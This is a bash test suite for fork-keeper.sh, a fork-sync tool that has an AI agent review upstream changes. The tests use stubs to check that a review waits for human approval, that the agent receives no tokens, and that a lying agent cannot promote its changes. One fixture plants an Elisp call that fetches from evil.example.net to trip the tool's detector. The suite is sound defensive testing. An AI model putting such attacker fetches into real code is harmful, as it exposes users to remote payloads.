#!/usr/bin/env bash
# Tests for fork-keeper.sh: pre-check, agent hand-off, and promotion.
#
# Everything runs against local fixture repos: bare upstream.git and
# origin.git stand in for GitHub, a stub `gh` keeps PR state in files, and a
# stub agent does what the fork-keeper skill does without a model.
set -euo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=devtools/fork-keeper/testlib.sh
. "$DIR/testlib.sh"
FK="$DIR/fork-keeper.sh"
CONTRACT="$DIR/testdata/claude-toolbox"

mkdir -p "$T/bin"

# Stub gh. State: $GH_STATE/prs.json, an array of
# {number, headRefName, labels: [name], head_override?}. A PR whose head is
# already in the fork's main counts as merged, as on GitHub.
cat >"$T/bin/gh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
s="$GH_STATE/prs.json"
[[ -f $s ]] || echo '[]' >"$s"
printf '%s\n' "$*" >>"$GH_STATE/calls"
G() { git --git-dir="$FAKE_ORIGIN" "$@"; }
upd() { jq "$@" "$s" >"$s.new" && mv "$s.new" "$s"; }
cmd="$1 $2"
shift 2
case $cmd in
"pr list")
	out='[]'
	for row in $(jq -c '.[]' "$s"); do
		head=$(G rev-parse -q --verify "refs/heads/$(jq -r .headRefName <<<"$row")") || continue
		G merge-base --is-ancestor "$head" refs/heads/main && continue
		out=$(jq -c --argjson r "$row" --arg h "$head" '. + [{
			number: $r.number, headRefName: $r.headRefName,
			headRefOid: ($r.head_override // $h),
			labels: [$r.labels[] | {name: .}]}]' <<<"$out")
	done
	echo "$out"
	;;
"pr create")
	head="" body=""
	while [[ $# -gt 0 ]]; do
		case $1 in
		--head) head=$2; shift 2 ;;
		--body-file) body=$2; shift 2 ;;
		*) shift ;;
		esac
	done
	n=$(($(jq length "$s") + 1))
	upd --argjson n "$n" --arg h "$head" '. + [{number: $n, headRefName: $h, labels: []}]'
	cp "$body" "$GH_STATE/body.$n"
	if [[ -n ${FAKE_GH_ON_CREATE:-} ]]; then bash -c "$FAKE_GH_ON_CREATE"; fi
	echo "https://github.invalid/pull/$n"
	;;
"pr edit")
	sel=$1
	shift
	while [[ $# -gt 0 ]]; do
		case $1 in
		--add-label) upd --arg b "$sel" --arg l "$2" 'map(if .headRefName == $b then .labels = (.labels + [$l] | unique) else . end)' ;;
		--remove-label) upd --arg b "$sel" --arg l "$2" 'map(if .headRefName == $b then .labels -= [$l] else . end)' ;;
		--body-file) cp "$2" "$GH_STATE/body.$sel" 2>/dev/null || cp "$2" "$GH_STATE/body.edit" ;;
		esac
		shift 2
	done
	;;
*)
	echo "gh stub: unsupported: $cmd $*" >&2
	exit 1
	;;
esac
EOF

# Stub agent: rebuilds the stack like the skill, then writes a verdict
# according to FAKE_AGENT_MODE (clean, needs-review, lie, none).
cat >"$T/bin/fake-agent" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
out=""
while [[ $# -gt 0 ]]; do
	case $1 in
	--out) out=$2; shift 2 ;;
	*) shift ;;
	esac
done
echo run >>"$GH_STATE/agent.runs"
env >"$GH_STATE/agent.env"
git remote >"$GH_STATE/agent.remotes"
range=$(bash "$FAKE_RR" -b main)
git checkout -q -B fork-keeper/candidate "$(jq -r .upstream_new <<<"$range")"
for c in $(jq -r '.user_commits[]' <<<"$range"); do git cherry-pick "$c" >/dev/null; done
verdict=clean
case $FAKE_AGENT_MODE in
needs-review) verdict=needs-review ;;
lie) range=$(jq -c '.first_run = false | .rewritten = false | .moved_tags = [] | .deleted_tags = []' <<<"$range") ;;
none) exit 0 ;;
esac
jq -n --arg v "$verdict" --arg h "$(git rev-parse HEAD)" --argjson r "$range" \
	'{schema: 1, verdict: $v, candidate_head: $h, range: $r, conflicts: [], findings: [], summary: "stub"}' \
	>"$out/verdict.json"
echo "stub report ($verdict)" >"$out/report.md"
EOF
chmod +x "$T/bin/gh" "$T/bin/fake-agent"

DATE=2026-11-10

# new_case <name>: fresh fixture, config, and gh state.
new_case() {
	CUR=$1
	mk_fixture
	export GH_STATE="$FX/gh"
	export FAKE_ORIGIN="$FX/origin.git"
	export FAKE_RR="$CONTRACT/review-range.sh"
	mkdir -p "$GH_STATE"
	jq -n --arg o "$FX/origin.git" --arg u "$FX/upstream.git" '{forks: [{
		name: "demo", repo: "me/demo", fork_url: $o, upstream_url: $u,
		branch: "main",
		agent: ["fake-agent", "sync", "--out", "{out}", "-b", "{branch}"]}]}' \
		>"$FX/forks.json"
	DATE=2026-11-10
}

# fk [mode]: run fork-keeper.sh once; sets OUT and RC.
fk() {
	RC=0
	OUT="$(FAKE_AGENT_MODE="${1:-clean}" \
		FORK_KEEPER_CONFIG="$FX/forks.json" \
		FORK_KEEPER_CACHE="$FX/cache" \
		FORK_KEEPER_SCRIPTS="$CONTRACT" \
		FORK_KEEPER_DATE="$DATE" \
		GH_TOKEN=secret-gh-token \
		PATH="$T/bin:$PATH" \
		bash "$FK" 2>&1)" || RC=$?
}

said() { grep -q -- "$1" <<<"$OUT"; }
runs() { if [[ -f $GH_STATE/agent.runs ]]; then wc -l <"$GH_STATE/agent.runs" | tr -d ' '; else echo 0; fi; }
labels() { jq -r --argjson n "$1" '.[] | select(.number == $n) | .labels | join(",")' "$GH_STATE/prs.json"; }
prs() { jq length "$GH_STATE/prs.json"; }
eq() { [[ $1 == "$2" ]]; }
has_label() { grep -q "$2" <<<"$(labels "$1")"; }
no_label() { ! has_label "$@"; }

# --- Upstream already contained in the fork: exit before anything else.
new_case up-to-date
record_head "$(uref refs/heads/main)"
fcommit mine.txt "my patch" >/dev/null
fk
check "rc=$RC $OUT" eq "$RC" 0
check "must report up-to-date: $OUT" said "up-to-date"
check "agent must not run" eq "$(runs)" 0
check "no gh PR calls" bash -c "! grep -qs \"pr create\" \"$GH_STATE/calls\""

# --- Clean verdict, quiet tripwires: push, PR, and promote.
new_case clean-promote
u0="$(uref refs/heads/main)"
record_head "$u0"
git --git-dir="$FX/origin.git" update-ref refs/fork-keeper/upstream-tags/v0 "$u0"
git --git-dir="$FX/upstream.git" update-ref refs/tags/v0 "$u0"
old_main="$(fcommit mine.txt "my patch")"
u1="$(ucommit README "more docs")"
git --git-dir="$FX/upstream.git" update-ref refs/tags/v1 "$u1"
fk clean
check "rc=$RC $OUT" eq "$RC" 0
check "must report promoted: $OUT" said "promoted"
check "one PR created" eq "$(prs)" 1
check "sync branch pushed" eq "$(oref refs/heads/sync/$DATE)" "$(oref refs/heads/main)"
check "main rebased onto upstream" git --git-dir="$FX/origin.git" merge-base --is-ancestor "$u1" refs/heads/main
check "main changed" test "$(oref refs/heads/main)" != "$old_main"
check "pre-sync tag on the old main" eq "$(oref refs/tags/pre-sync/$DATE)" "$old_main"
check "upstream-head recorded" eq "$(oref refs/fork-keeper/upstream-head)" "$u1"
check "tag mirror updated" eq "$(oref refs/fork-keeper/upstream-tags/v1)" "$u1"
check "no needs-review label" no_label 1 needs-review
check "agent env has no gh token" bash -c "! grep -q secret-gh-token '$GH_STATE/agent.env'"
check "agent env points gh at an empty config" grep -q "^GH_CONFIG_DIR=$FX/cache" "$GH_STATE/agent.env"
check "agent checkout has no remotes" test ! -s "$GH_STATE/agent.remotes"
check "PR body includes the agent report" grep -q "stub report (clean)" "$GH_STATE/body.1"

# --- First review always waits for the user, even when the agent says clean.
new_case first-run
fcommit mine.txt "my patch" >/dev/null
ucommit README "docs" >/dev/null
main_before="$(oref refs/heads/main)"
fk clean
check "must report needs-review: $OUT" said "needs-review"
check "needs-review label" has_label 1 needs-review
check "main untouched" eq "$(oref refs/heads/main)" "$main_before"
check "upstream-head not recorded" bash -c "! git --git-dir='$FX/origin.git' rev-parse -q --verify refs/fork-keeper/upstream-head"

# --- Tripwire hit overrides a clean verdict.
new_case tripwire
u0="$(uref refs/heads/main)"
record_head "$u0"
fcommit mine.txt "my patch" >/dev/null
ucommit lisp/x.el '(url-retrieve "https://evil.example.net/p")' >/dev/null
main_before="$(oref refs/heads/main)"
fk clean
check "must report needs-review: $OUT" said "needs-review"
check "needs-review label" has_label 1 needs-review
check "main untouched" eq "$(oref refs/heads/main)" "$main_before"
check "upstream-head untouched" eq "$(oref refs/fork-keeper/upstream-head)" "$u0"
check "PR body lists the tripwire" grep -q "evil.example.net" "$GH_STATE/body.1"

# --- needs-review sticks: a later clean review of harmless changes still
# waits for the user, and only fork-keeper:approved promotes.
new_case sticky
record_head "$(uref refs/heads/main)"
fcommit mine.txt "my patch" >/dev/null
ucommit README "docs" >/dev/null
main_before="$(oref refs/heads/main)"
fk needs-review
check "must report needs-review: $OUT" said "needs-review"
check "needs-review label" has_label 1 needs-review

CUR=sticky-wait
DATE=2026-11-11
fk clean
check "rc=$RC $OUT" eq "$RC" 0
check "must wait for review: $OUT" said "waiting for review"
check "agent must not rerun" eq "$(runs)" 1

CUR=sticky-refresh
u2="$(ucommit README "harmless docs")"
fk clean
check "must stay needs-review: $OUT" said "needs-review"
check "agent reran" eq "$(runs)" 2
check "same PR refreshed" eq "$(prs)" 1
check "sync branch has new upstream" git --git-dir="$FX/origin.git" merge-base --is-ancestor "$u2" refs/heads/sync/2026-11-10
check "main untouched" eq "$(oref refs/heads/main)" "$main_before"
check "label still there" has_label 1 needs-review

CUR=approved-stale-head
upd() { jq "$@" "$GH_STATE/prs.json" >"$GH_STATE/prs.new" && mv "$GH_STATE/prs.new" "$GH_STATE/prs.json"; }
upd '.[0].labels += ["fork-keeper:approved"] | .[0].head_override = "1111111111111111111111111111111111111111"'
fk clean
check "approval on another head must not promote: $OUT" said "waiting for review"
check "main untouched" eq "$(oref refs/heads/main)" "$main_before"

CUR=approved
upd 'del(.[0].head_override)'
pr_head="$(oref refs/heads/sync/2026-11-10)"
DATE=2026-11-12
fk clean
check "rc=$RC $OUT" eq "$RC" 0
check "must report promoted: $OUT" said "promoted"
check "main is the approved head" eq "$(oref refs/heads/main)" "$pr_head"
check "pre-sync tag on the old main" eq "$(oref refs/tags/pre-sync/2026-11-12)" "$main_before"
check "upstream-head is the reviewed upstream" eq "$(oref refs/fork-keeper/upstream-head)" "$u2"
check "agent did not run for approval" eq "$(runs)" 2

# --- Upstream rewrote history: never promote, even if the agent lies.
for mode in clean lie; do
	new_case "rewritten-$mode"
	ucommit README "one" >/dev/null
	fork_at_upstream
	record_head "$(uref refs/heads/main)"
	fcommit mine.txt "my patch" >/dev/null
	g "$FX/useed" reset -q --hard HEAD~1
	ucommit README "two" >/dev/null
	main_before="$(oref refs/heads/main)"
	fk "$mode"
	check "must report needs-review: $OUT" said "needs-review"
	check "needs-review label" has_label 1 needs-review
	check "main untouched" eq "$(oref refs/heads/main)" "$main_before"
done

# --- No verdict at all: never promote.
new_case no-verdict
record_head "$(uref refs/heads/main)"
fcommit mine.txt "my patch" >/dev/null
ucommit README "docs" >/dev/null
main_before="$(oref refs/heads/main)"
fk none
check "must report needs-review: $OUT" said "needs-review"
check "main untouched" eq "$(oref refs/heads/main)" "$main_before"

# --- The default branch moves under us: the lease fails and the fork-keeper
# refs stay put, so the next run reviews the same commits again.
new_case lease-lost
u0="$(uref refs/heads/main)"
record_head "$u0"
fcommit mine.txt "my patch" >/dev/null
ucommit README "docs" >/dev/null
export FAKE_GH_ON_CREATE="cd '$FX/fseed' && echo late >>late.txt && git add late.txt && git commit -q -m late && git push -q origin HEAD:main"
fk clean
unset FAKE_GH_ON_CREATE
check "rc must be non-zero: $OUT" test "$RC" -ne 0
check "must explain the force-push failure: $OUT" said "force-push"
check "upstream-head untouched" eq "$(oref refs/fork-keeper/upstream-head)" "$u0"

finish
